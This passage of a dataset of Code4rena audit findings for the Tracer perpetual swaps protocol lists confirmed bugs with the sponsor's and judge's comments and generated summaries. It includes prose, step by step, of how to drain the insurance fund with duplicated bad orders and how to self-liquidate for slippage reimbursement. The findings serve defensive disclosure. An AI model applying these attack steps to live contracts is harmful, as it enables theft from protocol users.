      "content": "_Submitted by gpersoon_\n\nA liquidator can always claim the liquidation escrow in the following way:\n- create a second account\n- setup a complimentary trade in that second account, which will result in a large slippage when executed\n- call `executeTrade` (which everyone can call), to execute a trade between his own two accounts with a large slippage\n- the slippage doesn't hurt because the liquidator owns both accounts\n- call `claimReceipt` with the receiptId of the executed order, within the required period (e.g. 15 minutes)\n\n[L67](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Trader.sol#L67)\n```solidity\nfunction executeTrade(Types.SignedLimitOrder[] memory makers, Types.SignedLimitOrder[] memory takers) external override {\n```\n[L394](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Liquidation.sol#L394)\n```solidity\nfunction claimReceipt( uint256 receiptId, Perpetuals.Order[] memory orders, address traderContract) external override {\n```\n\nRecommend to perhaps limit who can call `executeTrade`.\n\n**[raymogg (Tracer) acknowledged and confirmed](https://github.com/code-423n4/2021-06-tracer-findings/issues/2#issuecomment-873774429):**\n > Valid issue which would allow someone to get reimbursed for slippage against themselves.\n>\n> The Trader contract will have whitelisted relayers added to prevent issues like this (similar to #119)\n\n",
      "summary": "\nA bug has been identified in the code of the Tracer project where a liquidator can create a second account, set up a complimentary trade in that second account, and then call the `executeTrade` function, which anyone can call, to execute a trade between the two accounts with a large slippage. This slippage doesn't hurt the liquidator because they own both accounts. They can then call the `claimReceipt` function with the receiptId of the executed order, within the required period (e.g. 15 minutes).\n\nThe Tracer team has acknowledged and confirmed this bug and proposed to limit who can call the `executeTrade` function to prevent issues like this.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/2",
      "tags": [],
      "finders": []
    },
    {
      "id": "25498",
      "title": "[M-10] `prb-math` not audited",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon_\n\nThe library [`prb-math` documents](// https://github.com/hifi-finance/prb-math#security) have not been audited by a security researcher.  This means its more risky to rely on this library.\n\nRecommend considering (crowdsourcing) an audit for `prb-math`.\n\n**[raymogg (Tracer) confirmed](https://github.com/code-423n4/2021-06-tracer-findings/issues/11)**\n\n",
      "summary": "\nThe bug report submitted by gpersoon states that the library documents of `prb-math` have not been audited by a security researcher, making it more risky to rely on the library. To address this issue, it is recommended to consider crowdsourcing an audit for `prb-math`. Raymogg (Tracer) has confirmed this.\n\nAuditing the library documents of `prb-math` is important for ensuring the security of the library. Without an audit, it is difficult to identify any potential security risks or vulnerabilities in the library, which can be exploited by malicious actors. An audit can also help identify any weak points in the library and suggest improvements to strengthen the security of the library.\n\nCrowdsourcing an audit for `prb-math` is a viable solution as it can help reduce the cost of the audit and also help find more potential security issues. This can be done by inviting security researchers to audit the library documents and submit their findings. The findings can then be reviewed and used to improve the security of the library.\n\nOverall, it is important to audit the library documents of `prb-math` to ensure the security of the library. Crowdsourcing an audit is a viable solution to reduce the cost and also find more potential security issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/11",
      "tags": [],
      "finders": []
    },
    {
      "id": "25497",
      "title": "[M-09] Wrong funding index in settle when no base?",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `TracerPerpetualSwaps.settle` function updates the user's last index to `currentGlobalFundingIndex`, however a comment states:\n\n> \"// Note: global rates reference the last fully established rate (hence the -1), and not the current global rate. User rates reference the last saved user rate\"\n\nThe code for the `else` branch also updates the last index to `currentGlobalFundingIndex - 1` instead of `currentGlobalFundingIndex`.\n\n```solidity\nif (accountBalance.position.base == 0) {\n    // set to the last fully established index\n    // @audit shouldn't this be global - 1 like below?\n    accountBalance.lastUpdatedIndex = currentGlobalFundingIndex;\n    accountBalance.lastUpdatedGasPrice = IOracle(gasPriceOracle).latestAnswer();\n}\n```\n\nThe impact is that it might be possible for first-time depositors to skip having to pay the first funding rate period as the `accountLastUpdatedIndex + 1 < currentGlobalFundingIndex` check will still return `false` when the funding rates are updated the next time.\n\nRecommend to check if setting it to `currentGlobalFundingIndex` or to `currentGlobalFundingIndex - 1` is correct.\n\n**[raymogg (Tracer) confirmed but disagreed with severity](https://github.com/code-423n4/2021-06-tracer-findings/issues/106)**\n\n",
      "summary": "\nThis bug report is about the `TracerPerpetualSwaps.settle` function in the Tracer platform. The code for the `else` branch updates the user's last index to `currentGlobalFundingIndex - 1` instead of `currentGlobalFundingIndex`. This means that first-time depositors may be able to skip having to pay the first funding rate period. The impact of this bug is that it might be possible for first-time depositors to avoid paying the first funding rate period. The recommendation is to check the code to see if it should be set to `currentGlobalFundingIndex` or `currentGlobalFundingIndex - 1`. Raymogg (Tracer) confirmed the bug, but disagreed with the severity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/106",
      "tags": [],
      "finders": []
    },
    {
      "id": "25496",
      "title": "[M-08] Missing events for critical parameter changing operations by owner",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xRajeev_\n\nThe owner of `TracerPerpetualSwaps` contract, who is potentially untrusted as per specification, can change the market critical parameters such as the addresses of the `Liquidation`/`Pricing`/`Insurance`/`GasOracle`/`FeeReceiver` and also critical values such as  `feeRate`, `maxLeverage`, `fundingRateSensitivity`, `deleveragingCliff`, `lowestMaxLeverage`, `insurancePoolSwitchStage` and whitelisting.\n\nNone of these setter functions emit events to record these changes on-chain for off-chain monitors/tools/interfaces to register the updates and react if necessary.\n\nThe impact of this is that, if a malicious owner changes the critical addresses or values that significantly change the security posture/perception of the protocol. No events are emitted and users lose funds/confidence. The protocol takes a reputation hit.\n\nSee similar high-severity finding in [OpenZeppelins Audit of Audius](https://blog.openzeppelin.com/audius-contracts-audit/#high) and medium-severity finding [OpenZeppelins Audit of UMA Phase 4](https://blog.openzeppelin.com/uma-audit-phase-4/).\n\nRecommend to consider emitting events when these addresses/values are updated. This will be more transparent and it will make it easier to keep track of the status of the system.\n\n**[raymogg (Tracer) marked as duplicate of another (confirmed issue)](https://github.com/code-423n4/2021-06-tracer-findings/issues/64#issuecomment-873760825):**\n > Duplicate of #66\n\n**[cemozerr (Judge) reopened and removed duplicate label](https://github.com/code-423n4/2021-06-tracer-findings/issues/64#issuecomment-882106845):**\n > Opening this issue as the event emission seems to be separate from the arbitrarily changing of the values.\n\n",
      "summary": "\nThis bug report is about the TracerPerpetualSwaps contract. The issue is that the owner of the contract, who is potentially untrusted, can change the market critical parameters such as the addresses of the Liquidation/Pricing/Insurance/GasOracle/FeeReceiver and also critical values such as feeRate, maxLeverage, fundingRateSensitivity, deleveragingCliff, lowestMaxLeverage, insurancePoolSwitchStage and whitelisting. These changes are not recorded on-chain and therefore users lose funds/confidence and the protocol takes a reputation hit. This issue was marked as a duplicate of another confirmed issue, but it was then reopened and the duplicate label was removed as the event emission is separate from the arbitrarily changing of the values. \n\nThe recommendation is to consider emitting events when these addresses/values are updated, as this will make it easier to keep track of the status of the system and will be more transparent. This issue is similar to high-severity findings in OpenZeppelin's Audit of Audius and medium-severity finding in OpenZeppelin's Audit of UMA Phase 4.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/64",
      "tags": [],
      "finders": []
    },
    {
      "id": "25495",
      "title": "[M-07] Malicious owner can arbitrarily change fee to any % value",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xRajeev_\n\nThe Tracer protocol like any other allows market creators to charge fees for trades. However, a malicious/greedy owner can arbitrarily change fee to any % value and without an event to observe this change or a timelock to react, there is no easy way for users to monitor this via front-end or off-chain monitoring tools.\n\nThe impact is that, if the users are trading on a market with 0.1% fees and the owner suddenly changes this to 100%, the users realise this only after their trades are executed. Market loses confidence. Protocol takes a reputational hit.\n\nSee similar Medium-severity finding in [ConsenSys's Audit of 1inch Liquidity Protocol](https://consensys.net/diligence/audits/2020/12/1inch-liquidity-protocol/#unpredictable-behavior-for-users-due-to-admin-front-running-or-general-bad-timing)\n\nRecommend implementing an `Emit` event, and providing a timelock for users to react and establish an upper threshold for fees that is decided across markets by governance.\n\n**[raymogg (Tracer) confirmed](https://github.com/code-423n4/2021-06-tracer-findings/issues/66#issuecomment-873760964):**\n > Like the idea of having a timelock for any update parameter update that immediately affects traders\n\n",
      "summary": "\nThis bug report discusses an issue with the Tracer protocol which allows market creators to charge fees for trades. A malicious or greedy owner can arbitrarily change the fee to any percentage value, without an event to observe this change or a timelock for users to react. This means that users are unaware of the sudden change in fees until after their trades are executed, leading to a loss of confidence in the market and a reputational hit for the protocol.\n\nThe bug report recommends implementing an 'Emit' event and a timelock for users to react, as well as an upper threshold for fees that is decided across markets by governance. Raymogg (Tracer) confirmed that they like the idea of having a timelock for any update parameter update that immediately affects traders.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/66",
      "tags": [],
      "finders": []
    },
    {
      "id": "25494",
      "title": "[M-06] Single-step process for critical ownership transfer",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xRajeev_\n\nThe `Tracer Perpetuals Factory` contract is arguably the most critical contract in the project given that it deploys all the markets. The ownership of this contract is transferred to `_governance address`, i.e. TracerDAO, in the constructor. This critical address transfer in one-step is very risky because it is irrecoverable from any mistakes.\n\nThe impact is that, if an incorrect address (e.g. one for which the private key is not known) is used accidentally, then it prevents the use of all the `onlyOwner()` functions forever, which includes the changing of various deployer contract addresses and market approvals. This use of an incorrect address may not even be immediately apparent given that these functions are probably not used immediately. When noticed, due to a failing `onlyOwner()` function call, it will force the redeployment of the `factory` contract and require appropriate changes and notifications for switching from the old to new address. This will diminish trust in markets and incur a significant reputational damage. See [issue page](https://github.com/code-423n4/2021-06-tracer-findings/issues/43) for proof of concept.\n\nRecommend retaining the deployer ownership in the constructor and then using a two-step address change to `_governance` address separately using setter functions:\n1) Approve a new address as a `pendingOwner`\n2) A transaction from the `pendingOwner` (TracerDAO) address claims the pending ownership change.\n\nThis mitigates risk because if an incorrect address is used in step (1), then it can be fixed by re-approving the correct address. Only after a correct address is used in step (1) can step (2) happen and complete the address/ownership change.\n\n**[raymogg (Tracer) acknowledged](https://github.com/code-423n4/2021-06-tracer-findings/issues/43#issuecomment-873762658):**\n > Correct that having the owner be set to a wrong address could be detrimental, however for the first deploy of the factory, this will be owned by the DAO and will be easy to validate on deployment.\n>\n> Subsequent ownership transfers will be done via DAO proposal, and will have many eyes across them (due to them being a public Tracer DAO proposal) before function execution happens.\n>\n> For this reason it seems like a lot of overhead to have a two step process for this. Not withstanding that the issue you mention could still be possible\n\n",
      "summary": "\nThe Tracer Perpetuals Factory contract is an essential part of the project as it deploys all the markets. It is currently set up to transfer ownership to the TracerDAO in the constructor, which is a risky move as any mistakes made are irrecoverable. This could lead to the 'onlyOwner()' functions being blocked forever, preventing the changing of deployer contract addresses and market approvals. This could cause a lack of trust in the markets and reputational damage. \n\nTo mitigate this risk, it is recommended to keep the deployer ownership in the constructor and then use a two-step address change to the TracerDAO address separately using setter functions. This way, if an incorrect address is used in step (1), it can be fixed by re-approving the correct address. Only after a correct address is used in step (1) can step (2) happen and complete the address/ownership change. \n\nRaymogg (Tracer) acknowledged this issue and suggested that it would be a lot of overhead to have a two step process for this, as the first deploy of the factory will be owned by the DAO and subsequent ownership transfers will be done via public Tracer DAO proposal with many eyes across them.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/43",
      "tags": [],
      "finders": []
    },
    {
      "id": "25493",
      "title": "[M-05] Add reentrancy protections on function `executeTrade`",
      "impact": "MEDIUM",
      "content": "_Submitted by shw, also found by 0xRajeev_\n\nAs written in the to-do comments, reentrancy could happen in the `executeTrade` function of `Trader` since the `makeOrder.market` can be a user-controlled external contract. See [L121-L126](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Trader.sol#L121-L126) in `Trader.sol`.\n\nRecommend adding a reentrancy guard (e.g., the [implementation from OpenZeppelin](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol)) to prevent the users from reentering critical functions.\n\n**[raymogg (Tracer) disputed](https://github.com/code-423n4/2021-06-tracer-findings/issues/143#issuecomment-874405296):**\n > Disputing just as while this is important, its quite explicitly stated in the todo comment and as such is already known by the team as a potential issue.\n>\n> Realistically shouldn't be too much of a problem with whitelisting of the trader.\n\n**[cemozerr (Judge) commented](https://github.com/code-423n4/2021-06-tracer-findings/issues/143#issuecomment-882105114):**\n > Marking this as medium risk as, regardless of being noted by the team, still poses a security threat.\n\n**[OsmanBran (Tracer) commented](https://github.com/code-423n4/2021-06-tracer-findings/issues/143#issuecomment-874405296):**\n > Duplicate of [#72](https://github.com/code-423n4/2021-06-tracer-findings/issues/72)\n\n",
      "summary": "\nThis bug report is about the `executeTrade` function of the `Trader` contract which has a potential reentrancy issue. Reentrancy is a type of attack which could happen when a user-controlled external contract calls the `makeOrder.market` function. It is recommended to add a reentrancy guard, like the one from OpenZeppelin, to prevent users from reentering the critical functions. The bug report was disputed as the issue was already known by the team, but marked as medium risk by the judge. It was also found to be a duplicate of another bug report (#72).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/143",
      "tags": [],
      "finders": []
    },
    {
      "id": "25492",
      "title": "[M-04] Underflow problems occurring when a token has >18 decimals",
      "impact": "MEDIUM",
      "content": "_Submitted by tensors, also found by s1m0_\n\nThe contracts assume that all tokens will have <=18 decimals. This isn't necessarily a problem if the Tracer team is the only people deploying the contracts and they keep it in mind. But, If the contracts are to be deployed by other people, this assumption should be made explicit and hard-coded.\n\nWe can see that the scaler computations will underflow and be defined when it should not be In [L220-L232](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/lib/LibBalances.sol#L220-L232).\n\nRecommend writing a require check that ensures `tokenDecimals <= 18` before running the above functions.\n\n**[raymogg (Tracer) confirmed](https://github.com/code-423n4/2021-06-tracer-findings/issues/116#issuecomment-873755853):**\n > Valid issue and makes sense as a medium.\n>\n> Suggested mitigation will be implemented.\n\n",
      "summary": "\nThis bug report was submitted by tensors and found by s1m0. It concerns the contracts associated with the Tracer project. The contracts assume that all tokens will have a maximum of 18 decimals, however, this is not always the case. This can lead to scaler computations underflowing and being defined when it should not be. \n\nTo fix this issue, it is recommended to add a require check that ensures that tokenDecimals is <= 18 before running the associated functions. This was confirmed by raymogg (Tracer) who agreed that this was a valid issue and the suggested mitigation will be implemented.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/116",
      "tags": [],
      "finders": []
    },
    {
      "id": "25491",
      "title": "[M-03] Deflationary tokens are not supported",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel, also found by s1m0 and 0xRajeev_\n\nThere are ERC20 tokens that may make certain customizations to their ERC20 contracts.\nOne type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.\n\nThe `deposit()` functions of `Insurance` and `TracerPerpetualSwaps` assume that the external ERC20 balance of the contract increases by the same amount as the `amount` parameter of the `transferFrom`.\n\nThe user is credited the full amount without the taxes (`userBalance.position.quote`).\n\nRecommend as one possible mitigation, measuring the asset change right before and after the asset-transferring functions.\n\n**[raymogg (Tracer) confirmed but disagreed with severity](https://github.com/code-423n4/2021-06-tracer-findings/issues/104#issuecomment-873757118):**\n > Most likely not a medium risk as you can do a lot more nasty things than just use rebasing tokens. Since the owner of a market can set their own quote token, this token could be a token they control the supply of allowing them to arbitrarily transfer tokens between accounts, etc.\n>\n> As such, this sort of falls outside of our trust model. Market creators should use tokens that behave as \"standard\" ERC20s. We will make a not that rebasing and deflationary tokens should not be used as quote tokens without weird behaviour.\n>\n> Would be better as a low or informational issue due to this.\n\n**[cemozerr (Judge) downgraded severity from 2 to 1](https://github.com/code-423n4/2021-06-tracer-findings/issues/104#issuecomment-882104304):**\n > Marking this as low risk as it seems to fall outside of the trust model, yet important enough to communicate to users explicitly.\n\n",
      "summary": "\nThis bug report is about ERC20 tokens that may make certain customizations to their ERC20 contracts. One type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()` and this fee is not taken into account when using the `deposit()` functions of `Insurance` and `TracerPerpetualSwaps`. This means that the user is credited the full amount without the taxes (`userBalance.position.quote`). \n\nThe possible mitigation suggested is to measure the asset change right before and after the asset-transferring functions. The severity of the bug was initially marked as medium risk, however, it was later downgraded to low risk by raymogg (Tracer) as it falls outside of the trust model and should be communicated to users explicitly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/104",
      "tags": [],
      "finders": []
    },
    {
      "id": "25490",
      "title": "[M-02] No check `transferFrom()` return value",
      "impact": "MEDIUM",
      "content": "_Submitted by s1m0, also found by pauliax, shw, 0xRajeev, JMukesh, Lucius and cmichel_\n\nThe smart contract doesn't check the return value of `token.transfer()` and `token.transferFrom()`, some erc20 token might not revert in case of error but return false.\nIn the [TracerPerpetualSwaps:deposit](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/TracerPerpetualSwaps.sol#L151) and [Insurance:deposit](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/Insurance.sol#L51) this would allow a user to deposit for free. See issue page for other places.\n\nRecommend wrapping the call into a `require()` or using openzeppelin's [SafeERC20 library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol).\n\n**[raymogg (Tracer) confirmed](https://github.com/code-423n4/2021-06-tracer-findings/issues/115)**\n\n",
      "summary": "\nThis bug report concerns a security vulnerability in two smart contracts, TracerPerpetualSwaps and Insurance. The issue is that the contracts do not check the return value of token.transfer() and token.transferFrom(), which are two functions used to transfer tokens from one account to another. This means that if the token being transferred does not revert in case of an error, a user could potentially deposit tokens for free.\n\nThe bug was discovered and reported by s1m0, and later confirmed by raymogg (Tracer). The bug was also found by pauliax, shw, 0xRajeev, JMukesh, Lucius and cmichel.\n\nThe recommended solution is to wrap the call into a require() or to use the SafeERC20 library from OpenZeppelin. This library is designed to prevent the exploitation of security vulnerabilities.\n\nOverall, this bug report highlights the importance of using the SafeERC20 library from OpenZeppelin when dealing with ERC20 tokens. It also serves as a reminder to always check the return value of token.transfer() and token.transferFrom() in order to prevent users from depositing tokens for free.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/115",
      "tags": [],
      "finders": []
    },
    {
      "id": "25489",
      "title": "[M-01] Use of deprecated Chainlink API",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xRajeev, also found by a_delamo, cmichel and shw_\n\nThe contracts use Chainlinks deprecated API `latestAnswer()`. Such functions might suddenly stop working if Chainlink stopped supporting deprecated APIs.\n\nThe impact is that, if the deprecated API stops working, prices cannot be obtained, the protocol stops and contracts have to be redeployed.\n\nRecommend using V3 [interface functions](https://docs.chain.link/docs/price-feeds-api-reference/).\n\n**[raymogg (Tracer) confirmed in a separate issue](https://github.com/code-423n4/2021-06-tracer-findings/issues/145)**\n\n",
      "summary": "\nThis bug report was submitted by 0xRajeev as well as a_delamo, cmichel and shw who found the same issue. The issue is that the contracts use Chainlinks deprecated API `latestAnswer()`. This API might suddenly stop working if Chainlink stops supporting deprecated APIs. If this happens, prices cannot be obtained, the protocol stops and contracts have to be redeployed. To fix this issue, it is recommended to use the V3 interface functions found in the Chainlink Price Feeds API Reference. Raymogg (Tracer) confirmed this issue in a separate issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/73",
      "tags": [],
      "finders": []
    },
    {
      "id": "25488",
      "title": "[H-06] Wrong price scale for `GasOracle`",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe `GasOracle` uses two chainlink oracles (GAS in ETH with some decimals, USD per ETH with some decimals) and multiplies their raw return values to get the gas price in USD.\n\nHowever, the scaling depends on the underlying decimals of the two oracles and could be anything.\nBut the code assumes it's in 18 decimals.\n\n> \"Returned value is USD/Gas * 10^18 for compatibility with rest of calculations\"\n\nThere is a `toWad` function that seems to involve scaling but it is never used.\n\nThe impact is that, If the scale is wrong, the gas price can be heavily inflated or under-reported.\n\nRecommend checking `chainlink.decimals()` to know the decimals of the oracle answers and scale the answers to 18 decimals such that no matter the decimals of the underlying oracles, the `latestAnswer` function always returns the answer in 18 decimals.\n\n**[raymogg (Tracer) confirmed and disagreed with severity](https://github.com/code-423n4/2021-06-tracer-findings/issues/93#issuecomment-873750451):**\n > Disagree with severity as while the statement that the underlying decimals of the oracles could be anything, we will be using production Chainlink feeds for which the decimals are known at the time of deploy.\n>\n> This is still however an issue as you don't want someone using different oracles (eg non Chainlink) that have different underlying decimals and not realising that this contract will not support that.\n\n**[cemozerr (Judge) commented](https://github.com/code-423n4/2021-06-tracer-findings/issues/93#issuecomment-882123137):**\n > Marking this a high-risk issue as it poses a big threat to users deploying their own markets\n\n",
      "summary": "\nThe GasOracle is a smart contract that uses two chainlink oracles (GAS in ETH with some decimals, USD per ETH with some decimals) and multiplies their raw return values to get the gas price in USD. The code assumes the scale is in 18 decimals, however, the underlying decimals of the two oracles could be anything. This could result in the gas price being heavily inflated or under-reported.\n\nThe tracer suggested that this is not a severe issue as production Chainlink feeds have decimals that are known at the time of deploy. However, the judge marked this as a high-risk issue as it poses a big threat to users deploying their own markets.\n\nThe recommendation is to check `chainlink.decimals()` to know the decimals of the oracle answers and scale the answers to 18 decimals such that no matter the decimals of the underlying oracles, the `latestAnswer` function always returns the answer in 18 decimals.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/93",
      "tags": [],
      "finders": []
    },
    {
      "id": "25487",
      "title": "[H-05] Insurance slippage reimbursement can be used to steal insurance fund",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe `Liquidation` contract allows the liquidator to submit \"bad\" trade orders and the insurance reimburses them from the insurance fund, see `Liquidation.claimReceipt`.\nThe function can be called with an `orders` array, which does not check for duplicate orders.\nAn attacker can abuse this to make a profit by liquidating themselves, making a small bad trade and repeatedly submitting this bad trade for slippage reimbursement.\n\n**Example**:\n- Attacker uses two accounts, one as the liquidator and one as the liquidatee.\n- They run some high-leverage trades such that the liquidatee gets liquidated with the next price update. (If not cash out and make a profit this way through trading, and try again.)\n- Liquidator liquidates liquidatee\n- They now do two trades:\n  - One \"good\" trade at the market price that fills 99% of the liquidation amount. The slippage protection should not kick in for this trade\n  - One \"bad\" trade at a horrible market price that fills only 1% of the liquidation amount. This way the slippage protection kicks in for this trade\n- The liquidator now calls `claimReceipt(orders)` where `orders` is an array that contains many duplicates of the \"bad\" trade, for example 100 times. The `calcUnitsSold` function will return `unitsSold = receipt.amountLiquidated` and a bad `avgPrice`. They are now reimbursed the price difference on the full liquidation amount (instead of only on 1% of it) making an overall profit\n\nThis can be repeated until the insurance fund is drained.\n\nThe attacker has an incentive to do this attack as it's profitable and the insurance fund will be completely drained.\n\nRecommend disallowing duplicate orders in the `orders` argument of `claimReceipt`. This should make the attack at least unprofitable, but it could still be a griefing attack.\nA quick way to ensure that `orders` does not contain duplicates is by having liquidators submit the orders in a sorted way (by order ID) and then checking in the `calcUnitsSold` `for` loop that the current order ID is strictly greater than the previous one.\n\n**[BenjaminPatch (Tracer) confirmed](https://github.com/code-423n4/2021-06-tracer-findings/issues/105#issuecomment-873780483):**\n > Valid issue. The recommended mitigation step would also work. :+1:\n\n\n",
      "summary": "\nA bug has been identified in the `Liquidation` contract, which allows an attacker to make a profit by liquidating themselves and repeatedly submitting a bad trade for slippage reimbursement. This is done by setting up two accounts, one as the liquidator and one as the liquidatee, and running some high-leverage trades such that the liquidatee gets liquidated with the next price update. The liquidator then does two trades, one good trade at the market price that fills 99% of the liquidation amount, and one bad trade at a horrible market price that fills only 1% of the liquidation amount. This way, the slippage protection kicks in for the bad trade. The liquidator then calls `claimReceipt(orders)` with an array containing many duplicates of the bad trade, resulting in them being reimbursed the price difference on the full liquidation amount. This can be repeated until the insurance fund is drained.\n\nThe recommended mitigation step to prevent this attack is to disallow duplicate orders in the `orders` argument of `claimReceipt`. This should make the attack at least unprofitable, but it could still be a griefing attack. A quick way to ensure that `orders` does not contain duplicates is by having liquidators submit the orders in a sorted way (by order ID) and then checking in the `calcUnitsSold` `for` loop that the current order ID is strictly greater than the previous one. This mitigation step has been confirmed by BenjaminPatch (Tracer).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/105",
      "tags": [],
      "finders": []
    },
    {
      "id": "25486",
      "title": "[H-04] Logic error in fee subtraction",
      "impact": "HIGH",
      "content": "_Submitted by 0xsanson_\n\nIn `LibBalances.applyTrade()`, we need to collect a fee from the trade. However, the current code subtracts a fee from the short position and adds it to the long. The correct implementation is to subtract a fee to both (see `TracerPerpetualSwaps.sol` L272).\nThis issue causes withdrawals problems, since Tracer thinks it can withdraw the collect fees, leaving the users with an incorrect amount of quote tokens.\n\nRecommend changing `+fee` to `-fee` in the [highlighted line](https://github.com/code-423n4/2021-06-tracer/blob/main/src/contracts/lib/LibBalances.sol#L187).\n\n**[raymogg (Tracer) confirmed](https://github.com/code-423n4/2021-06-tracer-findings/issues/127#issuecomment-873778933):**\n > Valid issue \n\n",
      "summary": "\nA bug has been reported in the `LibBalances.applyTrade()` code of the TracerPerpetualSwaps.sol. The current code subtracts a fee from the short position and adds it to the long, which is incorrect. The correct implementation should subtract a fee from both. This bug causes withdrawal problems, since Tracer thinks it can withdraw the collected fees, leaving users with an incorrect amount of quote tokens.\n\nThe bug was confirmed by raymogg from Tracer and the recommended solution is to change the `+fee` to `-fee` in the highlighted line of the code. This bug should be fixed to ensure that users have the correct amount of quote tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-06-tracer",
      "github_link": "https://github.com/code-423n4/2021-06-tracer-findings/issues/127",
      "tags": [],
      "finders": []
    },
    {
      "id": "25485",
      "title": "[H-03] Malicious owner can drain the market at any time using `SafetyWithdraw`",
      "impact": "HIGH",
      "content": "_Submitted by 0xRajeev, also found by pauliax and gpersoon_\n\nThe `withdrawERC20Token()` in `SafetyWithdraw` inherited in `TracerPerpetualSwaps` is presumably a guarded launch emergency withdrawal mechanism. However, given the trust model where the market creator/owner is potentially untrusted/malicious, this is a dangerous approach to emergency withdrawal in the context of guarded launch.\n\nAlternatively, if this is meant for the owner to withdraw external ERC20 tokens mistakenly deposited to the Tracer market, then the function should exclude `tracerQuoteToken` from being the `tokenAddress` that can be used as a parameter to `withdrawERC20Token()`.\n\nThe impact of this is that, if a malicious owner of a market withdraws/rugs all `tracerQuoteToken`s deposited at any time after market launch, all users lose deposits and the protocol takes a reputational hit and has to refund the users from treasury.\n\nTherefor, it is recommended that, for a guarded launch circuit breaker, design a pause/unpause feature where deposits are paused (in emergency situations) but withdrawals are allowed by the depositors themselves instead of the owner. Alternatively, if this is meant to be for removing external ERC20 tokens accidentally deposited to market, exclude the `tracerQuoteToken` from being given as the `tokenAddress`.\n\n**[raymogg (Tracer) confirmed but suggested a severity of 2 ](https://github.com/code-423n4/2021-06-tracer-findings/issues/81#issuecomment-873752133):**\n > The only reason for the dispute on severity is that as part of the security model, the owner can manipulate the market in other ways (such as changing the oracle being used), so this trust assumption over the owner already exists. For this reason the team thinks this issue is closer to a medium\n>\n> This however is a good issue as it is not the greatest circuit breaking mechanism, and as noted in #7 can reflect badly on the project without the exploit being used. The mechanism is being removed and replaced with more structured circuit breaker.\n\n**[cemozerr (Judge) commented](https://github.com/code-423n4/2021-06-tracer-findings/issues/81#issuecomment-882110087):**\n > Marking this as high risk, as regardless of the owner manipulating in other ways, the threat persists.\n\n",
